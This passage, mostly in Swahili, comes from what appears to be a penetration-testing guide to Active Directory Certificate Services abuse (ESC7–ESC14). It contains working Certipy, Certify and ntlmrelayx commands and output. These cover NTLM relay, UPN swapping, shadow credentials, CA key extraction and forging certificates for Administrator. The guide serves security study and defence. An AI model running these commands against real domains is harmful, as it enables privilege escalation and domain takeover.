[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Maelezo

Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwasha attributes za EDITF au kuidhinisha maombi yanayosubiri), **Certify 2.0** ilifichua mbinu mpya kabisa inayohitaji tu jukumu la *Manage Certificates* (yaani **Certificate Manager / Officer**) kwenye Enterprise CA.<sup>[[3]](#references)</sup>

Mbinu ya RPC ya `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yoyote mwenye *Manage Certificates*. Ingawa mbinu hii kwa kawaida ilitumiwa na CAs halali kusasisha extensions kwenye maombi **yanayosubiri**, mshambuliaji anaweza kuitumia vibaya **kuongeza extension ya cheti isiyo ya chaguomsingi** (kwa mfano OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye ombi linalosubiri kuidhinishwa.

Kwa kuwa template inayolengwa **haifafanui thamani ya chaguomsingi ya extension hiyo**, CA HAIANDIKI juu ya thamani inayodhibitiwa na mshambuliaji ombi litakapotolewa hatimaye. Kwa hiyo, cheti kitakachotolewa huwa na extension iliyochaguliwa na mshambuliaji ambayo inaweza:

* Kutimiza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo hatarini (na kusababisha kupandisha mamlaka).
* Kuingiza EKUs au policies za ziada zinazoipa cheti uaminifu usiotarajiwa katika mifumo ya wahusika wengine.

Kwa kifupi, *Manage Certificates* — ambayo hapo awali ilichukuliwa kuwa sehemu “isiyo na nguvu sana” ya ESC7 — sasa inaweza kutumiwa kupandisha mamlaka kikamilifu au kuweka persistence ya muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki yenye vizuizi zaidi ya *Manage CA*.

#### Kutumia vibaya mbinu hii kwa Certify 2.0

1. **Wasilisha ombi la cheti litakalobaki *pending*.** Hili linaweza kulazimishwa kwa kutumia template inayohitaji idhini ya meneja:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Ongeza extension maalum kwenye ombi linalosubiri** kwa kutumia command mpya ya `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Ikiwa template haijaweka tayari extension ya *Certificate Issuance Policies*, thamani iliyo hapo juu itahifadhiwa baada ya kutolewa kwa cheti.*

3. **Tuma ombi** (ikiwa role yako pia ina haki za idhini za *Manage Certificates*) au subiri operator aliidhinishe. Baada ya cheti kutolewa, ipakue:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Cheti kilichopatikana sasa kina OID ya sera ya utoaji yenye madhara na kinaweza kutumika katika mashambulizi yanayofuata (kwa mfano, ESC13, kupandisha mamlaka kwenye domain, n.k.).

> NOTE: Shambulio hilohilo linaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia amri ya `ca` na kigezo cha `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika mazingira ambamo **AD CS imesakinishwa**, ikiwa kuna **endpoint ya usajili wa wavuti iliyo hatarini** na angalau **template moja ya cheti imechapishwa** inayoruhusu **kompyuta za domain kujisajili na kutumia uthibitishaji wa client** (kama template chaguomsingi ya **`Machine`**), mshambuliaji anaweza **kuathiri kompyuta yoyote ambayo huduma ya spooler imewashwa**!

AD CS hutumia **mbinu kadhaa za usajili zinazotegemea HTTP**, zinazopatikana kupitia majukumu ya ziada ya seva ambayo wasimamizi wanaweza kusakinisha. Miunganisho hii ya usajili wa cheti kupitia HTTP iko hatarini kwa **mashambulizi ya NTLM relay**. Mshambuliaji, kutoka kwenye **mashine iliyoathiriwa, anaweza kuiga akaunti yoyote ya AD inayothibitisha kupitia NTLM inayoingia**. Akiwa anaiga akaunti ya mwathiriwa, mshambuliaji anaweza kufikia miunganisho hii ya wavuti ili **kuomba cheti cha uthibitishaji wa client kwa kutumia template za cheti za `User` au `Machine`**.

- **Kiolesura cha usajili wa wavuti** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`), kwa chaguomsingi hutumia HTTP pekee, ambayo haitoi ulinzi dhidi ya mashambulizi ya NTLM relay. Zaidi ya hayo, kinaruhusu waziwazi uthibitishaji wa NTLM pekee kupitia kichwa chake cha Authorization HTTP, hivyo mbinu salama zaidi za uthibitishaji kama Kerberos haziwezi kutumika.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa chaguomsingi huunga mkono uthibitishaji wa negotiate kupitia kichwa chao cha Authorization HTTP. Uthibitishaji wa negotiate **huunga mkono Kerberos na NTLM**, hivyo mshambuliaji anaweza **kushusha uthibitishaji hadi NTLM** wakati wa mashambulizi ya relay. Ingawa huduma hizi za wavuti huwezesha HTTPS kwa chaguomsingi, HTTPS pekee **hailindi dhidi ya mashambulizi ya NTLM relay**. Ulinzi dhidi ya mashambulizi ya NTLM relay kwa huduma za HTTPS unawezekana tu HTTPS ikiunganishwa na channel binding. Kwa bahati mbaya, AD CS haiwashi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.<sup>[[6]](#references)</sup>

**Tatizo** la kawaida katika mashambulizi ya NTLM relay ni **muda mfupi wa vipindi vya NTLM** na kutoweza kwa mshambuliaji kuwasiliana na huduma **zinazohitaji NTLM signing**.

Hata hivyo, kizuizi hiki kinaweza kushindwa kwa kutumia shambulio la NTLM relay kupata cheti cha mtumiaji, kwa kuwa muda wa kipindi huamuliwa na muda wa uhalali wa cheti, na cheti kinaweza kutumiwa na huduma **zinazohitaji NTLM signing**. Kwa maelekezo ya kutumia cheti kilichoibwa, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha mashambulizi ya NTLM relay ni kwamba **akaunti ya mwathiriwa lazima ithibitishe kwenye mashine inayodhibitiwa na mshambuliaji**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huu:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Matumizi mabaya**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` huorodhesha **endpoints za HTTP za AD CS zilizowezeshwa**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Sifa ya `msPKI-Enrollment-Servers` hutumiwa na Certificate Authorities (CAs) za biashara kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia zana ya **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Matumizi mabaya kwa kutumia Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Matumizi mabaya kwa [Certipy](https://github.com/ly4k/Certipy)

Kwa chaguomsingi, Certipy huomba cheti kwa kutumia template `Machine` au `User`, kutegemea kama jina la akaunti inayofanyiwa relay linaishia na `$`. Template mbadala inaweza kubainishwa kwa kutumia parameter ya `-template`.

Kisha mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumiwa kulazimisha authentication. Unaposhughulikia domain controllers, ni lazima ubainishe `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani ya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, huondoa kiendelezi cha SID `szOID_NTDS_CA_SECURITY_EXT` kwenye cheti. Mifano ya zamani ya ESC9 hutegemea tabia ya uoanifu ya KDC (`StrongCertificateBindingEnforcement=1`) au njia tofauti ya ulinganishaji dhaifu ya Schannel. Thamani ya `1` ni **mpangilio wa kihistoria wa uoanifu**, si chaguo-msingi la sasa: Microsoft inasema kwamba ubatilishaji wa KDC uliacha kuungwa mkono baada ya sasisho la usalama la Windows la Septemba 9, 2025. Kagua sasisho halisi la lengwa na endpoint ya uthibitishaji kabla ya kutumia utaratibu wa zamani.<sup>[[7]](#references)</sup> Tazama [mwongozo wa Microsoft wa utekelezaji](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Masharti ambayo chini yake mpangilio wa flag hii huwa muhimu ni pamoja na:

- Kwenye KDC ya zamani inayoendana, sera inayotumika ya ulinganishaji wa cheti huruhusu ulinganishaji; au, endpoint ya Schannel huwezesha kando ulinganishaji wa UPN kupitia bit `0x4` ya `CertificateMappingMethods`.
- Cheti kina alama ya flag `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya mpangilio wa `msPKI-Enrollment-Flag`.
- Cheti kinabainisha EKU yoyote ya uthibitishaji wa mteja.
- Ruhusa za `GenericWrite` zinapatikana kwenye akaunti yoyote ili kuhatarisha akaunti nyingine.

### Hali ya Matumizi Mabaya

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` kwenye `Jane@corp.local`, na lengo ni kuhatarisha `Administrator@corp.local`. Template ya cheti ya `ESC9`, ambayo `Jane@corp.local` anaruhusiwa kujiandikisha nayo, imesanidiwa kwa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` katika mpangilio wake wa `msPKI-Enrollment-Flag`.

Mwanzoni, hash ya `Jane` hupatikana kwa kutumia Shadow Credentials, kutokana na ruhusa za `GenericWrite` za `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya domain @corp.local:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Marekebisho haya hayakiuki vikwazo, kwa kuwa `Administrator@corp.local` inabaki tofauti na `userPrincipalName` ya `Administrator`.

Baada ya hapo, template ya certificate ya `ESC9`, iliyowekwa alama kuwa hatarishi, inaombwa kama `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila “object SID”.

Kisha `userPrincipalName` ya `Jane` inarejeshwa katika hali yake ya awali, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Kujaribu kuthibitisha utambulisho kwa kutumia cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuishwe na `-domain <domain>` kwa sababu cheti hakibainishi domain:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Ulinganishaji Dhaifu wa Vyeti - ESC10

### Maelezo

Sera mbili tofauti za ulinganishaji wa vyeti hujadiliwa mara nyingi chini ya ESC10. Soma mipangilio kwenye endpoint inayoshughulikia uthibitishaji husika:

- `CertificateMappingMethods` ya Schannel chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` hudhibiti ulinganishaji wa vyeti vya mteja vya TLS kwenye seva ya programu. Biti ya UPN ni `0x4`; thamani chaguomsingi kwenye mifumo iliyosasishwa ni `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` ya KDC chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` kihistoria ilidhibiti uoanifu wa ulinganishaji wa vyeti vya Kerberos. Thamani ya `1` si chaguomsingi la sasa linaloweza kutegemewa, na Microsoft ilisitisha usaidizi wa override hii kupitia sasisho la usalama la Windows la Septemba 9, 2025. Hali yake pekee haielezi ulinganishaji wa UPN wa Schannel.<sup>[[7]](#references)</sup>

**Kisa cha 1**

Kihistoria, KDC ya zamani ilipoheshimu `StrongCertificateBindingEnforcement=0`; thibitisha kiwango cha sasisho kwa sababu override hii haitumiki tena kwenye mifumo ya sasa iliyosasishwa.

**Kisa cha 2**

Wakati biti ya UPN (`0x4`) ya `CertificateMappingMethods` imewashwa kwenye endpoint ya cheti cha mteja cha Schannel. Huu ni mpangilio tofauti na enforcement ya ulinganishaji thabiti ya KDC, na bado unahitaji cheti cha uthibitishaji wa mteja kinachoweza kuombewa pamoja na udhibiti halisi wa sifa ya akaunti inayolinganishwa.

### Kisa cha Matumizi Mabaya 1

Katika usanidi wa zamani ambapo KDC bado inaheshimu `StrongCertificateBindingEnforcement=0`, udhibiti wa `userPrincipalName` ya akaunti unaweza kuwa sehemu ya njia ya ulinganishaji dhaifu kuelekea akaunti nyingine. Mahitaji ya uombaji wa cheti, ulinganishaji, utambulisho lengwa na uthibitishaji uliofaulu lazima yathibitishwe kando; ACE ya `GenericWrite` au thamani ya registry pekee haithibitishi kutwaliwa kwa akaunti.

Kwa mfano, ikiwa ana ruhusa za `GenericWrite` kwenye `Jane@corp.local`, mshambulizi analenga kuathiri `Administrator@corp.local`. Utaratibu huu unafanana na ESC9, na kuruhusu kutumia template yoyote ya cheti.

Kwanza, hash ya `Jane` hupatikana kwa kutumia Shadow Credentials, kwa kutumia vibaya ruhusa za `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kwa makusudi ili kuepuka ukiukaji wa kizuizi.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Kufuatia hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kama `Jane`, kwa kutumia template chaguomsingi ya `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa thamani yake ya awali, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Kuthibitisha kwa kutumia cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`; ni lazima kubainisha domain kwenye amri kwa kuwa cheti hakina maelezo ya domain.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Kesi ya Matumizi Mabaya 2

Kwa `CertificateMappingMethods` yenye alama ya biti ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza compromise akaunti yoyote B isiyo na sifa ya `userPrincipalName`, ikiwemo akaunti za mashine na msimamizi wa kikoa aliyejengewa ndani `Administrator`.

Hapa, lengo ni compromise `DC$@corp.local`, kwa kuanza kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` ya `Jane` kisha huwekwa kuwa `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia kiolezo chaguomsingi cha `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` ya `Jane` inarejeshwa katika hali yake ya awali baada ya mchakato huu.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Ili kuthibitisha kupitia Schannel, chaguo la Certipy `-ldap-shell` linatumika, likionyesha kuwa uthibitishaji umefaulu kama `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Kupitia LDAP shell, amri kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), na huenda zikahatarisha domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Athari hii pia inahusu akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambayo `userPrincipalName` yake hailingani na `sAMAccountName`. Akaunti ya kawaida ya `Administrator@corp.local` ni lengwa kuu kwa sababu ina ruhusa za juu za LDAP na kwa chaguo-msingi haina `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa kwa `IF_ENFORCEENCRYPTICERTREQUEST`, mashambulizi ya NTLM relay yanaweza kufanywa kupitia huduma ya RPC bila signing. [Rejelea hapa](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Unaweza kutumia `certipy` kuchunguza ikiwa `Enforce Encryption for Requests` imezimwa; `certipy` itaonyesha Vulnerabilities za `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Hali ya Matumizi Mabaya

Inahitaji kusanidi seva ya relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Kumbuka: Kwa domain controllers, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access kwa ADCS CA yenye YubiHSM - ESC12

### Maelezo

Wasimamizi wanaweza kusanidi Certificate Authority ili ihifadhiwe kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye seva ya CA kupitia mlango wa USB, au kupitia USB device server ikiwa seva ya CA ni mashine pepe, ufunguo wa uthibitishaji (wakati mwingine huitwa "password") unahitajika ili Key Storage Provider izalishe na kutumia funguo kwenye YubiHSM.

Ufunguo/password hii huhifadhiwa katika registry bila usimbaji fiche kwenye `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Rejelea [hapa](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Hali ya matumizi mabaya

Ikiwa ufunguo wa faragha wa CA umehifadhiwa kwenye kifaa halisi cha USB unapopata shell access, inawezekana kuupata.

Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma), kisha:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Hatimaye, tumia amri ya certutil `-sign` kutengeneza certificate mpya ya kiholela kwa kutumia certificate ya CA na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` huruhusu sera ya utoaji kuongezwa kwenye certificate template. Vipengee vya `msPKI-Enterprise-Oid` vinavyohusika na kutoa sera vinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya kontena la PKI OID. Sera inaweza kuunganishwa na kikundi cha AD kwa kutumia sifa ya `msDS-OIDToGroupLink` ya kipengee hiki, na hivyo kuwezesha mfumo kumuidhinisha mtumiaji anayewasilisha certificate kana kwamba ni mwanachama wa kikundi hicho. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Kwa maneno mengine, mtumiaji anapokuwa na ruhusa ya kujiandikisha kupata certificate na certificate hiyo imeunganishwa na kikundi cha OID, mtumiaji anaweza kurithi mapendeleo ya kikundi hicho.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

Tafuta ruhusa ya mtumiaji kwa kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujiandikisha kwa `VulnerableTemplate`, mtumiaji anaweza kurithi haki za kikundi cha `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template pekee; atapata cheti chenye haki za OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Matumizi Mabaya ya Explicit Certificate Mapping — ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping yana ufafanuzi wa kina sana. Hapa chini kuna nukuu ya maandishi asilia.<sup>[[14]](#references)</sup>

ESC14 hushughulikia udhaifu unaotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa attribute ya `altSecurityIdentities` kwenye akaunti za watumiaji au kompyuta za Active Directory. Attribute hii yenye thamani nyingi huwawezesha wasimamizi kuhusisha wenyewe vyeti vya X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Inapojazwa, mappings hizi za wazi zinaweza kubatilisha mantiki chaguomsingi ya certificate mapping, ambayo kwa kawaida hutegemea UPN au majina ya DNS katika SAN ya cheti, au SID iliyopachikwa kwenye security extension ya `szOID_NTDS_CA_SECURITY_EXT`.

Mapping "dhaifu" hutokea pale thamani ya mfuatano inayotumiwa ndani ya attribute ya `altSecurityIdentities` kutambua cheti inapokuwa pana mno, rahisi kukisiwa, inategemea sehemu za cheti zisizo za kipekee, au inatumia vipengele vya cheti vinavyoweza kughushiwa kwa urahisi. Ikiwa mshambuliaji anaweza kupata au kutengeneza cheti ambacho attributes zake zinalingana na mapping dhaifu ya wazi iliyofafanuliwa kwa akaunti yenye mamlaka ya juu, anaweza kutumia cheti hicho kujithibitisha kama akaunti hiyo na kuiga utambulisho wake.

Mifano ya mfuatano wa mapping wa `altSecurityIdentities` unaoweza kuwa dhaifu ni pamoja na:

- Kufanya mapping kwa kutumia Subject Common Name (CN) ya kawaida pekee: kwa mfano, `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kupata cheti chenye CN hii kutoka chanzo kisicho salama sana.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs za jumla mno bila sifa za ziada kama nambari mahususi ya serial au subject key identifier: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia mifumo mingine inayotabirika au vitambulishi visivyo vya kriptografia ambavyo mshambuliaji anaweza kutimiza kwenye cheti anachoweza kupata kihalali au kughushi (ikiwa amehatarisha CA au amepata template yenye udhaifu kama ilivyo katika ESC1).

Attribute ya `altSecurityIdentities` hutumia miundo mbalimbali ya mapping, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (hufanya mapping kwa kutumia Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (hufanya mapping kwa kutumia thamani ya kiendelezi cha Subject Key Identifier cha cheti)
- `X509:<SR>SerialNumberBackedByIssuerDN` (hufanya mapping kwa kutumia nambari ya serial, ambayo huhusishwa na Issuer DN) - huu si muundo wa kawaida; kwa kawaida huwa `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (hufanya mapping kwa kutumia jina la RFC822, kwa kawaida anwani ya barua pepe, kutoka SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-RawPublicKey` (hufanya mapping kwa kutumia SHA1 hash ya ufunguo ghafi wa umma wa cheti - kwa ujumla ni imara)

Usalama wa mappings hizi hutegemea vitambulishi vilivyotumika kwenye mapping. Microsoft huainisha mappings zinazotegemea barua pepe au majina ya subject, ikiwemo `X509:<RFC822>`, kuwa **dhaifu**. Katika hali ya Full Enforcement, cheti kisicho na mapping imara hukataliwa; sasisho la usalama la Windows la Septemba 2025 liliondoa chaguo la kurejea kwenye hali ya Compatibility. Kwa hivyo, mapping dhaifu pekee si njia ya kuaminika ya sasa ya kuiga utambulisho. Kabla ya kutathmini hali inayohusu mapping dhaifu, kagua kiwango halisi cha viraka vya domain controller na tabia yake ya certificate mapping. Ruhusa ya kuandika kwenye `altSecurityIdentities` ni kidokezo tofauti: mshambuliaji aliye na cheti kinachoaminika kinachofaa anaweza kuongeza mapping **imara** ya wazi, kutegemea ruhusa zinazotumika na uthibitishaji wa cheti. Angalia [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) na [utafiti wa ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Pia, hitilafu za uthibitishaji wa cheti zinahitaji kuchunguzwa: akaunti lengwa iliyozimwa au nenosiri lililoisha muda wake vinaweza kuzuia kuingia hata kama cheti chenyewe bado ni halali.

### Hali ya Matumizi Mabaya

ESC14 hulenga **explicit certificate mappings** katika Active Directory (AD), hasa attribute ya `altSecurityIdentities`. Ikiwa attribute hii imewekwa (kwa makusudi au kutokana na usanidi usio sahihi), washambuliaji wanaweza kuiga akaunti kwa kuwasilisha vyeti vinavyolingana na mapping hiyo.

#### Hali A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`

 **Sharti la awali**: Mshambuliaji ana ruhusa za kuandika kwenye attribute ya `altSecurityIdentities` ya akaunti lengwa, au ana ruhusa ya kumpa mtu mwingine uwezo huo kupitia mojawapo ya ruhusa zifuatazo kwenye kitu lengwa cha AD:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Hali B: Lengwa Lina Mapping Dhaifu kupitia X509RFC822 (Barua pepe)

- **Sharti la awali la kihistoria/la kutegemea mazingira**: Lengwa lina mapping dhaifu ya X509RFC822 katika `altSecurityIdentities`, mshambuliaji anaweza kuhariri attribute ya `mail` ya enrollee, na template inayofaa hujumuisha barua pepe hiyo kwenye cheti cha client-authentication bila SID binding inayokinzana. Uthibitishaji pia unahitaji mazingira ambayo bado yanakubali mapping dhaifu; Full Enforcement hukataa certificate mappings dhaifu pekee. Attribute ya `mail` inayoweza kuandikwa pekee ni kidokezo tu.
#### Hali C: Lengwa Lina Mapping ya X509IssuerSubject

